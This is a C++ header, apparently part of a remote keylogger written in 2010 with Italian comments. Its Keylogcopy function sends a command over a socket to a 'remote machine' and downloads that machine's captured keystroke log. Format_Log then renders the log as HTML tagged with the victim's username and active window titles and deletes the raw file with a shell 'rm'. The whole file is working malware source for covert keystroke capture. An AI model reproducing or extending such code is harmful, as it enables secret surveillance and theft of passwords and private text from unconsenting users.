/* 
 * File:   Keylog.h
 * Author: redo86
 *
 * Created on 4 luglio 2010, 15.39
 */

#ifndef KEYLOG_H
#define	KEYLOG_H



#endif	/* KEYLOG_H */

//void Format_Log formatta in modo comprensibile il file di log
//void Keylog_copy copia il file di log della macchina remota
#include<iostream>
using namespace std;

int GetFileSize(string filename){
     struct stat file_info;
     if(!stat(filename.c_str(),&file_info))
     return file_info.st_size;
     return -1;
}

void Format_Log(){

     int File_Size=0,File_Buff=1024;
     int W_count=0,R_count=0;

     FILE *Log_File, *Fuck_File;
     char Read[1024];
     char Write[1024];
     //char(1)
     char Start_Keylog[] = "<br><br>\r\n\r\n<font size=\"6\" color=\"red\">=================================================================</font><font size=\"5\" color=\"red\">\r\n<br>\r\n<br>\r\nKeylog start at:</font><font size=\"3\">\t\t";
     int Strlen_Start_Keylog=strlen(Start_Keylog);
     //char(2)
     char Start_Keylog_Fine[MAX_COMPUTERNAME_LENGTH + 120] = "<br>\r\n<br>\r\n</font><font size=\"4\" color=\"green\"><br>\r\nUsing Username: </font><font size=\"3\" color=\"black\"> ";
     strcat(Start_Keylog_Fine,Username);
     strcat(Start_Keylog_Fine,"</font><br>\r\n");
     int Strlen_Start_Keylog_Fine=strlen(Start_Keylog_Fine);
     //char(3)
     char Window_Application[] = "<br>\r\n<br>\r\n<font size=\"4\" color=\"blue\">========Window Application:</font>  <font size=\"3\" color=\"black\">";
     int Strlen_Window_Application=strlen(Window_Application);
     //char(4)
     char Window_Application_Fine[] = "</font><font size=\"4\" color=\"blue\">========<br>\r\n<br>\r\n</font>";
     int Strlen_Window_Application_Fine=strlen(Window_Application_Fine);

     Fuck_File = fopen("keylog","rb");
     File_Size=GetFileSize("keylog");
     if(File_Size<0){cout<<"Errore nella conversione del file"<<endl;return;}
     Log_File=fopen("Keylog.html","ab");

     if(File_Size<=1024){File_Size=fread(Read,1,File_Size,Fuck_File);Read[File_Size]='\0';}

     else {fread(Read,1,File_Buff,Fuck_File);Read[1024]='\0';}

     File_Size-=1024;

     string exec="rm keylog";
     while(1){

		  if(Read[R_count]=='\0'){

				if((int)File_Size<=0){

                             if(W_count!=0)W_count=fwrite(Write,1,W_count,Log_File);
                             fclose(Fuck_File);
                             fclose(Log_File);
                             system(exec.c_str());
                             BackSpace(41);
                             cout<<"Operazione completata,il log e\' nel file Klog.html"<<endl<<endl;
                             return;

				}

				else{

                  if(File_Size<=1024){File_Size=fread(Read,1,File_Size,Fuck_File);Read[File_Size]='\0';}

                  else {fread(Read,1,File_Buff,Fuck_File);Read[1024]='\0';}

                  File_Size-=1024;

                  R_count=0;

				}

			}

		  else if(Read[R_count]==char(1)){

            R_count++;
            if(W_count!=0){W_count=fwrite(Write,1,W_count,Log_File);W_count=0;}
            Strlen_Start_Keylog=fwrite(Start_Keylog,1,Strlen_Start_Keylog,Log_File);

		  }

		  else if(Read[R_count]==char(2)){

            R_count++;
            if(W_count!=0){W_count=fwrite(Write,1,W_count,Log_File);W_count=0;}
            Strlen_Start_Keylog_Fine=fwrite(Start_Keylog_Fine,1,Strlen_Start_Keylog_Fine,Log_File);

		  }

		  else if(Read[R_count]==char(3)){

            R_count++;
            if(W_count!=0){W_count=fwrite(Write,1,W_count,Log_File);W_count=0;}
            Strlen_Window_Application=fwrite(Window_Application,1,Strlen_Window_Application,Log_File);

		  }

		  else if(Read[R_count]==char(4)){

            R_count++;
            if(W_count!=0){W_count=fwrite(Write,1,W_count,Log_File);W_count=0;}
            Strlen_Window_Application_Fine=fwrite(Window_Application_Fine,1,Strlen_Window_Application_Fine,Log_File);

		  }

		  else{

           Write[W_count]=Read[R_count];
           W_count++;
           R_count++;

		  }

	 }

}


void Keylogcopy(string cmd){

     send(cl_sk,cmd.c_str(),cmd.size(),0);
     char size[SIZE],buffer[MAX_PATH];
     long int file_size=0;
     int fine;
     FILE *fp;
     int dwbr=0;
     fine=recv(cl_sk,size,SIZE,0);
     size[fine]='\0';
     file_size=atoi(size);

     if(file_size>0){

          cout<<"Ricezione log in corso...";
          fp=fopen("keylog","ab");

          while (1){

           dwbr=recv(cl_sk,buffer,MAX_PATH,0);
           fwrite (buffer , 1 , dwbr , fp );
           file_size-=dwbr;
           if(file_size<=0)break;

          }

          fclose(fp);
          BackSpace(33);
          cout<<"File Ricevuto,attendere formattazione...";
          Format_Log();

     }

     else cout<<"File di log vuoto"<<endl<<endl;
     return;

}